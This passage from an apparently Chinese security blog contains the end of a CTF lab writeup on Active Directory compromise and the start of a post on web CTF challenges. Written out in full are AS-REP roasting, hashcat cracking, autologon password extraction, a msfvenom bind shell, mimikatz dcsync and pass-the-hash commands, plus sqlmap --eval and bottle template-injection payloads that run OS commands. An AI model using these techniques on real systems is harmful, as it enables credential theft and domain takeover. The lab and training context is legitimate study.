| YI XUE |\r| 291 | chujun@xiaorang.lab | 15854942459 | CHU JUN |\r| 292 | shenshan@xiaorang.lab | 17712052191 | SHEN SHAN |\r| 293 | lefen@xiaorang.lab | 13271196544 | LE FEN |\r| 294 | yubo@xiaorang.lab | 13462202742 | YU BO |\r| 295 | helianrui@xiaorang.lab | 15383000907 | HE LIAN RUI |\r| 296 | xuanqun@xiaorang.lab | 18843916267 | XUAN QUN |\r| 297 | shangjun@xiaorang.lab | 15162486698 | SHANG JUN |\r| 298 | huguang@xiaorang.lab | 18100586324 | HU GUANG |\r| 299 | wansifu@xiaorang.lab | 18494761349 | WAN SI FU |\r| 300 | fenghong@xiaorang.lab | 13536727314 | FENG HONG |\r| 301 | wanyan@xiaorang.lab | 17890844429 | WAN YAN |\r| 302 | diyan@xiaorang.lab | 18534028047 | DI YAN |\r| 303 | xiangyu@xiaorang.lab | 13834043047 | XIANG YU |\r| 304 | songyan@xiaorang.lab | 15282433280 | SONG YAN |\r| 305 | fandi@xiaorang.lab | 15846960039 | FAN DI |\r| 306 | xiangjuan@xiaorang.lab | 18120327434 | XIANG JUAN |\r| 307 | beirui@xiaorang.lab | 18908661803 | BEI RUI |\r| 308 | didi@xiaorang.lab | 13413041463 | DI DI |\r| 309 | zhubin@xiaorang.lab | 15909558554 | ZHU BIN |\r| 310 | lingchun@xiaorang.lab | 13022790678 | LING CHUN |\r| 311 | zhenglu@xiaorang.lab | 13248244873 | ZHENG LU |\r| 312 | xundi@xiaorang.lab | 18358493414 | XUN DI |\r| 313 | wansishun@xiaorang.lab | 18985028319 | WAN SI SHUN |\r| 314 | yezongyue@xiaorang.lab | 13866302416 | YE ZONG YUE |\r| 315 | bianmei@xiaorang.lab | 18540879992 | BIAN MEI |\r| 316 | shanshao@xiaorang.lab | 18791488918 | SHAN SHAO |\r| 317 | zhenhui@xiaorang.lab | 13736784817 | ZHEN HUI |\r| 318 | chengli@xiaorang.lab | 15913267394 | CHENG LI |\r| 319 | yufen@xiaorang.lab | 18432795588 | YU FEN |\r| 320 | jiyi@xiaorang.lab | 13574211454 | JI YI |\r| 321 | panbao@xiaorang.lab | 13675851303 | PAN BAO |\r| 322 | mennane@xiaorang.lab | 15629706208 | MEN NAN E |\r| 323 | fengsi@xiaorang.lab | 13333432577 | FENG SI |\r| 324 | mingyan@xiaorang.lab | 18296909463 | MING YAN |\r| 325 | luoyou@xiaorang.lab | 15759321415 | LUO YOU |\r| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |\r| 327 | nongyan@xiaorang.lab | 18097386975 | NONG YAN |\r| 328 | haolun@xiaorang.lab | 15152700465 | HAO LUN |\r| 329 | oulun@xiaorang.lab | 13402760696 | OU LUN |\r| 330 | weichipeng@xiaorang.lab | 18057058937 | WEI CHI PENG |\r| 331 | qidiaofang@xiaorang.lab | 18728297829 | QI DIAO FANG |\r| 332 | xuehe@xiaorang.lab | 13398862169 | XUE HE |\r| 333 | chensi@xiaorang.lab | 18030178713 | CHEN SI |\r| 334 | guihui@xiaorang.lab | 17882514129 | GUI HUI |\r| 335 | fuyue@xiaorang.lab | 18298436549 | FU YUE |\r| 336 | wangxing@xiaorang.lab | 17763645267 | WANG XING |\r| 337 | zhengxiao@xiaorang.lab | 18673968392 | ZHENG XIAO |\r| 338 | guhui@xiaorang.lab | 15166711352 | GU HUI |\r| 339 | baoai@xiaorang.lab | 15837430827 | BAO AI |\r| 340 | hangzhao@xiaorang.lab | 13235488232 | HANG ZHAO |\r| 341 | xingye@xiaorang.lab | 13367587521 | XING YE |\r| 342 | qianyi@xiaorang.lab | 18657807767 | QIAN YI |\r| 343 | xionghong@xiaorang.lab | 17725874584 | XIONG HONG |\r| 344 | zouqi@xiaorang.lab | 15300430128 | ZOU QI |\r| 345 | rongbiao@xiaorang.lab | 13034242682 | RONG BIAO |\r| 346 | gongxin@xiaorang.lab | 15595839880 | GONG XIN |\r| 347 | luxing@xiaorang.lab | 18318675030 | LU XING |\r| 348 | huayan@xiaorang.lab | 13011805354 | HUA YAN |\r| 349 | duyue@xiaorang.lab | 15515878208 | DU YUE |\r| 350 | xijun@xiaorang.lab | 17871583183 | XI JUN |\r| 351 | daiqing@xiaorang.lab | 18033226216 | DAI QING |\r| 352 | yingbiao@xiaorang.lab | 18633421863 | YING BIAO |\r| 353 | hengteng@xiaorang.lab | 15956780740 | HENG TENG |\r| 354 | changwu@xiaorang.lab | 15251485251 | CHANG WU |\r| 355 | chengying@xiaorang.lab | 18788248715 | CHENG YING |\r| 356 | luhong@xiaorang.lab | 17766091079 | LU HONG |\r| 357 | tongxue@xiaorang.lab | 18466102780 | TONG XUE |\r| 358 | xiangqian@xiaorang.lab | 13279611385 | XIANG QIAN |\r| 359 | shaokang@xiaorang.lab | 18042645434 | SHAO KANG |\r| 360 | nongzhu@xiaorang.lab | 13934236634 | NONG ZHU |\r| 361 | haomei@xiaorang.lab | 13406913218 | HAO MEI |\r| 362 | maoqing@xiaorang.lab | 15713298425 | MAO QING |\r| 363 | xiai@xiaorang.lab | 18148404789 | XI AI |\r| 364 | bihe@xiaorang.lab | 13628593791 | BI HE |\r| 365 | gaoli@xiaorang.lab | 15814408188 | GAO LI |\r| 366 | jianggong@xiaorang.lab | 15951118926 | JIANG GONG |\r| 367 | pangning@xiaorang.lab | 13443921700 | PANG NING |\r| 368 | ruishi@xiaorang.lab | 15803112819 | RUI SHI |\r| 369 | wuhuan@xiaorang.lab | 13646953078 | WU HUAN |\r| 370 | qiaode@xiaorang.lab | 13543564200 | QIAO DE |\r| 371 | mayong@xiaorang.lab | 15622971484 | MA YONG |\r| 372 | hangda@xiaorang.lab | 15937701659 | HANG DA |\r| 373 | changlu@xiaorang.lab | 13734991654 | CHANG LU |\r| 374 | liuyuan@xiaorang.lab | 15862054540 | LIU YUAN |\r| 375 | chenggu@xiaorang.lab | 15706685526 | CHENG GU |\r| 376 | shentuyun@xiaorang.lab | 15816902379 | SHEN TU YUN |\r| 377 | zhuangsong@xiaorang.lab | 17810274262 | ZHUANG SONG |\r| 378 | chushao@xiaorang.lab | 18822001640 | CHU SHAO |\r| 379 | heli@xiaorang.lab | 13701347081 | HE LI |\r| 380 | haoming@xiaorang.lab | 15049615282 | HAO MING |\r| 381 | xieyi@xiaorang.lab | 17840660107 | XIE YI |\r| 382 | shangjie@xiaorang.lab | 15025010410 | SHANG JIE |\r| 383 | situxin@xiaorang.lab | 18999728941 | SI TU XIN |\r| 384 | linxi@xiaorang.lab | 18052976097 | LIN XI |\r| 385 | zoufu@xiaorang.lab | 15264535633 | ZOU FU |\r| 386 | qianqing@xiaorang.lab | 18668594658 | QIAN QING |\r| 387 | qiai@xiaorang.lab | 18154690198 | QI AI |\r| 388 | ruilin@xiaorang.lab | 13654483014 | RUI LIN |\r| 389 | luomeng@xiaorang.lab | 15867095032 | LUO MENG |\r| 390 | huaren@xiaorang.lab | 13307653720 | HUA REN |\r| 391 | yanyangmei@xiaorang.lab | 15514015453 | YAN YANG MEI |\r| 392 | zuofen@xiaorang.lab | 15937087078 | ZUO FEN |\r| 393 | manyuan@xiaorang.lab | 18316106061 | MAN YUAN |\r| 394 | yuhui@xiaorang.lab | 18058257228 | YU HUI |\r| 395 | sunli@xiaorang.lab | 18233801124 | SUN LI |\r| 396 | guansixin@xiaorang.lab | 13607387740 | GUAN SI XIN |\r| 397 | ruisong@xiaorang.lab | 13306021674 | RUI SONG |\r| 398 | qiruo@xiaorang.lab | 13257810331 | QI RUO |\r| 399 | jinyu@xiaorang.lab | 18565922652 | JIN YU |\r| 400 | shoujuan@xiaorang.lab | 18512174415 | SHOU JUAN |\r| 401 | yanqian@xiaorang.lab | 13799789435 | YAN QIAN |\r| 402 | changyun@xiaorang.lab | 18925015029 | CHANG YUN |\r| 403 | hualu@xiaorang.lab | 13641470801 | HUA LU |\r| 404 | huanming@xiaorang.lab | 15903282860 | HUAN MING |\r| 405 | baoshao@xiaorang.lab | 13795275611 | BAO SHAO |\r| 406 | hongmei@xiaorang.lab | 13243605925 | HONG MEI |\r| 407 | manyun@xiaorang.lab | 13238107359 | MAN YUN |\r| 408 | changwan@xiaorang.lab | 13642205622 | CHANG WAN |\r| 409 | wangyan@xiaorang.lab | 13242486231 | WANG YAN |\r| 410 | shijian@xiaorang.lab | 15515077573 | SHI JIAN |\r| 411 | ruibei@xiaorang.lab | 18157706586 | RUI BEI |\r| 412 | jingshao@xiaorang.lab | 18858376544 | JING SHAO |\r| 413 | jinzhi@xiaorang.lab | 18902437082 | JIN ZHI |\r| 414 | yuhui@xiaorang.lab | 15215599294 | YU HUI |\r| 415 | zangpeng@xiaorang.lab | 18567574150 | ZANG PENG |\r| 416 | changyun@xiaorang.lab | 15804640736 | CHANG YUN |\r| 417 | yetai@xiaorang.lab | 13400150018 | YE TAI |\r| 418 | luoxue@xiaorang.lab | 18962643265 | LUO XUE |\r| 419 | moqian@xiaorang.lab | 18042706956 | MO QIAN |\r| 420 | xupeng@xiaorang.lab | 15881934759 | XU PENG |\r| 421 | ruanyong@xiaorang.lab | 15049703903 | RUAN YONG |\r| 422 | guliangxian@xiaorang.lab | 18674282714 | GU LIANG XIAN |\r| 423 | yinbin@xiaorang.lab | 15734030492 | YIN BIN |\r| 424 | huarui@xiaorang.lab | 17699257041 | HUA RUI |\r| 425 | niuya@xiaorang.lab | 13915041589 | NIU YA |\r| 426 | guwei@xiaorang.lab | 13584571917 | GU WEI |\r| 427 | qinguan@xiaorang.lab | 18427953434 | QIN GUAN |\r| 428 | yangdanhan@xiaorang.lab | 15215900100 | YANG DAN HAN |\r| 429 | yingjun@xiaorang.lab | 13383367818 | YING JUN |\r| 430 | weiwan@xiaorang.lab | 13132069353 | WEI WAN |\r| 431 | sunduangu@xiaorang.lab | 15737981701 | SUN DUAN GU |\r| 432 | sisiwu@xiaorang.lab | 18021600640 | SI SI WU |\r| 433 | nongyan@xiaorang.lab | 13312613990 | NONG YAN |\r| 434 | xuanlu@xiaorang.lab | 13005748230 | XUAN LU |\r| 435 | yunzhong@xiaorang.lab | 15326746780 | YUN ZHONG |\r| 436 | gengfei@xiaorang.lab | 13905027813 | GENG FEI |\r| 437 | zizhuansong@xiaorang.lab | 13159301262 | ZI ZHUAN SONG |\r| 438 | ganbailong@xiaorang.lab | 18353612904 | GAN BAI LONG |\r| 439 | shenjiao@xiaorang.lab | 15164719751 | SHEN JIAO |\r| 440 | zangyao@xiaorang.lab | 18707028470 | ZANG YAO |\r| 441 | yangdanhe@xiaorang.lab | 18684281105 | YANG DAN HE |\r| 442 | chengliang@xiaorang.lab | 13314617161 | CHENG LIANG |\r| 443 | xudi@xiaorang.lab | 18498838233 | XU DI |\r| 444 | wulun@xiaorang.lab | 18350490780 | WU LUN |\r| 445 | yuling@xiaorang.lab | 18835870616 | YU LING |\r| 446 | taoya@xiaorang.lab | 18494928860 | TAO YA |\r| 447 | jinle@xiaorang.lab | 15329208123 | JIN LE |\r| 448 | youchao@xiaorang.lab | 13332964189 | YOU CHAO |\r| 449 | liangduanzhi@xiaorang.lab | 15675237494 | LIANG DUAN ZHI |\r| 450 | jiagupiao@xiaorang.lab | 17884962455 | JIA GU PIAO |\r| 451 | ganze@xiaorang.lab | 17753508925 | GAN ZE |\r| 452 | jiangqing@xiaorang.lab | 15802357200 | JIANG QING |\r| 453 | jinshan@xiaorang.lab | 13831466303 | JIN SHAN |\r| 454 | zhengpubei@xiaorang.lab | 13690156563 | ZHENG PU BEI |\r| 455 | cuicheng@xiaorang.lab | 17641589842 | CUI CHENG |\r| 456 | qiyong@xiaorang.lab | 13485427829 | QI YONG |\r| 457 | qizhu@xiaorang.lab | 18838859844 | QI ZHU |\r| 458 | ganjian@xiaorang.lab | 18092585003 | GAN JIAN |\r| 459 | yurui@xiaorang.lab | 15764121637 | YU RUI |\r| 460 | feishu@xiaorang.lab | 18471512248 | FEI SHU |\r| 461 | chenxin@xiaorang.lab | 13906545512 | CHEN XIN |\r| 462 | shengzhe@xiaorang.lab | 18936457394 | SHENG ZHE |\r| 463 | wohong@xiaorang.lab | 18404022650 | WO HONG |\r| 464 | manzhi@xiaorang.lab | 15973350408 | MAN ZHI |\r| 465 | xiangdong@xiaorang.lab | 13233908989 | XIANG DONG |\r| 466 | weihui@xiaorang.lab | 15035834945 | WEI HUI |\r| 467 | xingquan@xiaorang.lab | 18304752969 | XING QUAN |\r| 468 | miaoshu@xiaorang.lab | 15121570939 | MIAO SHU |\r| 469 | gongwan@xiaorang.lab | 18233990398 | GONG WAN |\r| 470 | qijie@xiaorang.lab | 15631483536 | QI JIE |\r| 471 | shaoting@xiaorang.lab | 15971628914 | SHAO TING |\r| 472 | xiqi@xiaorang.lab | 18938747522 | XI QI |\r| 473 | jinghong@xiaorang.lab | 18168293686 | JING HONG |\r| 474 | qianyou@xiaorang.lab | 18841322688 | QIAN YOU |\r| 475 | chuhua@xiaorang.lab | 15819380754 | CHU HUA |\r| 476 | yanyue@xiaorang.lab | 18702474361 | YAN YUE |\r| 477 | huangjia@xiaorang.lab | 13006878166 | HUANG JIA |\r| 478 | zhouchun@xiaorang.lab | 13545820679 | ZHOU CHUN |\r| 479 | jiyu@xiaorang.lab | 18650881187 | JI YU |\r| 480 | wendong@xiaorang.lab | 17815264093 | WEN DONG |\r| 481 | heyuan@xiaorang.lab | 18710821773 | HE YUAN |\r| 482 | mazhen@xiaorang.lab | 18698248638 | MA ZHEN |\r| 483 | shouchun@xiaorang.lab | 15241369178 | SHOU CHUN |\r| 484 | liuzhe@xiaorang.lab | 18530936084 | LIU ZHE |\r| 485 | fengbo@xiaorang.lab | 15812110254 | FENG BO |\r| 486 | taigongyuan@xiaorang.lab | 15943349034 | TAI GONG YUAN |\r| 487 | gesheng@xiaorang.lab | 18278508909 | GE SHENG |\r| 488 | songming@xiaorang.lab | 13220512663 | SONG MING |\r| 489 | yuwan@xiaorang.lab | 15505678035 | YU WAN |\r| 490 | diaowei@xiaorang.lab | 13052582975 | DIAO WEI |\r| 491 | youyi@xiaorang.lab | 18036808394 | YOU YI |\r| 492 | rongxianyu@xiaorang.lab | 18839918955 | RONG XIAN YU |\r| 493 | fuyi@xiaorang.lab | 15632151678 | FU YI |\r| 494 | linli@xiaorang.lab | 17883399275 | LIN LI |\r| 495 | weixue@xiaorang.lab | 18672465853 | WEI XUE |\r| 496 | hejuan@xiaorang.lab | 13256081102 | HE JUAN |\r| 497 | zuoqiutai@xiaorang.lab | 18093001354 | ZUO QIU TAI |\r| 498 | siyi@xiaorang.lab | 17873307773 | SI YI |\r| 499 | shenshan@xiaorang.lab | 18397560369 | SHEN SHAN |\r| 500 | tongdong@xiaorang.lab | 15177549595 | TONG DONG |\r+-----+----------------------------+-------------+-----------------+ oa管理员账户密码\n[1 entry]\r+----+------------------+---------------+\r| id | password | username |\r+----+------------------+---------------+\r| 1 | bo2y8kAL3HnXUiQo | administrator |\r+----+------------------+---------------+ FLAG3\u0026amp;FLAG4 AS-REPRoasting 拿到这堆user信息我们大概可以猜到要打AS-REPRoasting了\n先把这堆用户整理成一个用户字典user.txt\n我们可以通过impacket-GetNPUsers工具进行枚举，收集配置了“不需要预身份验证”的用户\nproxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/ 可以拿到两个用户的TGT票据\n$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c\r$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1 用hashcat爆破出明文密码，用的kali自带的rockyou字典\nhashcat -m 18200 --force -a 0 \u0026#39;$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c\u0026#39; ./rockyou.txt\rhashcat -m 18200 --force -a 0 \u0026#39;$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1\u0026#39; ./rockyou.txt wenshao@xiaorang.lab/hellokitty\rzhangxin@xiaorang.lab/strawberry 尝试rdp到172.22.6.12\n发现没授权远程登录\n但是另一台机子172.22.6.25是可以登上的，但是拿不到flag\n我们先信息收集一手\n传一个SharpHound\nSharpHound.exe -c all Find Shortest Paths to Domain Admins\n可以看到yuxuan这个用户有SIDHistory，也就是说相当于是域管\n所有我们下一个目标就是要拿下yuxuan这个用户\n而且yuxuan这个用户在172.22.6.25上拥有会话。（HasSession）\n用户与计算机时进行会话时，凭据会保留在内存中。说明用户登陆过该主机。\nHasSession 方法一 直接查注册表，可以看到yuxuan这个账户设置了自动登录，而且能拿到明文密码\nreg query \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; 在 Windows 系统中，域用户自动登录的相关设置保存在注册表中。具体路径为 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon。若该路径下存在 AutoAdminLogon 键值且其数据数值为 1，同时 DefaultDomainName DefaultUserName DefaultPassword 等键值也有相应的正确设置，那么说明该域用户设置了自动登录。\nyuxuan/Yuxuan7QbrgZ3L 方法二 小豌豆信息收集一手就能抓到\n方法三 用户设置了自动登录可以用msf抓取自动登录的账户密码\nmsf生成一个正向代理的shell，在靶机上运行\nmsfvenom -p windows/meterpreter/bind_tcp -f exe -o 1.exe 接着用msf连上去\nuse exploit/multi/handler\rset payload windows/meterpreter/bind_tcp\rset rhost 172.22.6.25\rrun 抓自动登录的账号密码\nmeterpreter \u0026gt; run windows/gather/credentials/windows_autologin HasSIDHistory SID History是在域迁移过程中需要使用的一个属性。\n如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。\nSID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源\n域权限维持-SID History - xiaoxiaosen - 博客园\n拿到明文密码我们直接rdp上去\n因为有SID History这个用户可以访问域管的资源，所以我们可以直接拿mimikatz去dump域管的hash\nlsadump::dcsync /domain:xiaorang.lab /all /csv 拿到域管的hash\n500 Administrator 04d93ffd6f5f6e4490e0de23f240a5e9 512 接下来我们就可以PTH拿flag了\nproxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.12 C:\\Windows\\system32\u0026gt; type c:\\Users\\Administrator\\flag\\flag04.txt\rAwesome! you got the final flag.\r:::::::::::::::::::::::::: :::: ::::::::::\r:+: :+: +:+:+: :+:+:+:+:\r+:+ +:+ +:+ +:+:+ +:++:+\r+#+ +#+ +#+ +:+ +#++#++:++#\r+#+ +#+ +#+ +#++#+\r#+# #+# #+# #+##+#\r### ############## #############\rflag04: flag{26180e6b-5b97-47ca-a861-a160ef12166c} proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.25 C:\\Windows\\system32\u0026gt; type c:\\Users\\Administrator\\flag\\flag03.txt\rflag03: flag{ff39758a-623e-4f1f-b0bb-bb5f6d31ca83}\rMaybe you can find something interesting on this server.\r=======================================\rWhat you may not know is that many objects in this domain\rare moved from other domains. ","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/","summary":"\u003cp\u003e\u003cem\u003e靶标介绍：\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Time-Writeup"},{"content":"sqlmap-master 题目\n1from fastapi import FastAPI, Request 2from fastapi.responses import FileResponse, StreamingResponse 3import subprocess 4 5app = FastAPI() 6 7@app.get(\u0026#34;/\u0026#34;) 8async def index(): 9 return FileResponse(\u0026#34;index.html\u0026#34;) 10 11@app.post(\u0026#34;/run\u0026#34;) 12async def run(request: Request): 13 data = await request.json() 14 url = data.get(\u0026#34;url\u0026#34;) 15 16 if not url: 17 return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} 18 19 command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; 20 21 def generate(): 22 process = subprocess.Popen( 23 command.split(), 24 stdout=subprocess.PIPE, 25 stderr=subprocess.STDOUT, 26 shell=False 27 ) 28 29 while True: 30 output = process.stdout.readline() 31 if output == \u0026#39;\u0026#39; and process.poll() is not None: 32 break 33 if output: 34 yield output 35 36 return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 其实就是一个网页端的sqlmap\n看一下sqlmap的使用文档\n可以通过\u0026ndash;eval执行python代码，而且有回显\npayload\n127.0.0.1 --eval=print(__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;env\u0026#34;).read()) ez_dash 题目\n1\u0026#39;\u0026#39;\u0026#39; 2Hints: Flag在环境变量中 3\u0026#39;\u0026#39;\u0026#39; 4 5 6from typing import Optional 7 8 9import pydash 10import bottle 11 12 13 14__forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, 15 \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, 16 \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, 17 \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, 18 \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, 19 \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, 20 \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, 21 \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, 22 \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, 23 \u0026#34;Optional\u0026#34;,\u0026#34;func\u0026#34;,\u0026#34;render\u0026#34;, 24 ] 25__forbidden_name__=[ 26 \u0026#34;bottle\u0026#34; 27] 28__forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) 29 30def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: 31 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False 32 for word in __forbidden_name__: 33 if name==word: 34 return False 35 for word in __forbidden_path__: 36 if path.find(word)\u0026gt;=0: return False 37 obj=globals()[name] 38 try: 39 pydash.set_(obj,path,value) 40 except: 41 return False 42 return True 43 44@bottle.post(\u0026#39;/setValue\u0026#39;) 45def set_value(): 46 name = bottle.request.query.get(\u0026#39;name\u0026#39;) 47 path=bottle.request.json.get(\u0026#39;path\u0026#39;) 48 if not isinstance(path,str): 49 return \u0026#34;no\u0026#34; 50 if len(name)\u0026gt;6 or len(path)\u0026gt;32: 51 return \u0026#34;no\u0026#34; 52 value=bottle.request.json.get(\u0026#39;value\u0026#39;) 53 return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; 54 55@bottle.get(\u0026#39;/render\u0026#39;) 56def render_template(): 57 path=bottle.request.query.get(\u0026#39;path\u0026#39;) 58 if path.find(\u0026#34;{\u0026#34;)\u0026gt;=0 or path.find(\u0026#34;}\u0026#34;)\u0026gt;=0 or path.find(\u0026#34;.\u0026#34;)\u0026gt;=0: 59 return \u0026#34;Hacker\u0026#34; 60 return bottle.template(path) 61bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 非预期\nbottle的ssti不一定需要{}\npayload\n\u0026lt;h\u0026gt;\r%import os;os.system(\u0026#39;whoami\u0026#39;)\r%end\r\u0026lt;/h\u0026gt; ez_dash_revenge 题目\n1\u0026#39;\u0026#39;\u0026#39; 2Hints: Flag在环境变量中 3\u0026#39;\u0026#39;\u0026#39; 4 5 6from typing import Optional 7 8 9import pydash 10import bottle 11 12 13 14__forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, 15 \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, 16 \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, 17 \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, 18 \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, 19 \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, 20 \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, 21 \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, 22 \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, 23 \u0026#34;Optional\u0026#34;,\u0026#34;render\u0026#34; 24 ] 25__forbidden_name__=[ 26 \u0026#34;bottle\u0026#34; 27] 28__forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) 29 30def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: 31 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False 32 for word in __forbidden_name__: 33 if name==word: 34 return False 35 for word in __forbidden_path__: 36 if path.find(word)\u0026gt;=0: return False 37 obj=globals()[name] 38 try: 39 pydash.set_(obj,path,value) 40 except: 41 return False 42 return True 43 44@bottle.post(\u0026#39;/setValue\u0026#39;) 45def set_value(): 46 name = bottle.request.query.get(\u0026#39;name\u0026#39;) 47 path=bottle.request.json.get(\u0026#39;path\u0026#39;) 48 if not isinstance(path,str): 49 return \u0026#34;no\u0026#34; 50 if len(name)\u0026gt;6 or len(path)\u0026gt;32: 51 return \u0026#34;no\u0026#34; 52 value=bottle.request.json.get(\u0026#39;value\u0026#39;) 53 